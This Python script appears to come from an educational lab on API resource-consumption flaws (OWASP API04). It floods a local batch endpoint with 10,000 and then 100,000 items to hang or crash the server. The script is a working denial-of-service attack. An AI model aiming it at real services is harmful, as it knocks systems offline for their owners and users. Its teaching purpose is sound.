#!/usr/bin/env python3
"""
API04 Unrestricted Resource Consumption - Batch Operation Abuse
Educational demonstration of how unbounded batch processing can be exploited.
"""

import requests

API_URL = "http://localhost:5004"

def batch_attack(batch_size=100000):
    """Abuse batch processing with oversized requests"""
    # Create massive batch
    items = [{"data": f"item-{i}"} for i in range(batch_size)]
    
    print(f"Sending batch with {len(items):,} items...")
    print("This will likely hang or crash the server...\n")
    
    try:
        response = requests.post(
            f"{API_URL}/api/batch/process",
            json={"items": items},
            timeout=30
        )
        
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            data = response.json()
            print(f"Processed: {data.get('count', 0)} items")
    except requests.exceptions.Timeout:
        print("ERROR: Request timed out (server likely overwhelmed)")
    except Exception as e:
        print(f"ERROR: {e}")

if __name__ == '__main__':
    # Start with moderate size
    print("Attack 1: Medium batch (10,000 items)")
    batch_attack(batch_size=10000)
    
    print("\n" + "="*60 + "\n")
    
    # Increase to massive size
    print("Attack 2: Large batch (100,000 items)")
    batch_attack(batch_size=100000)
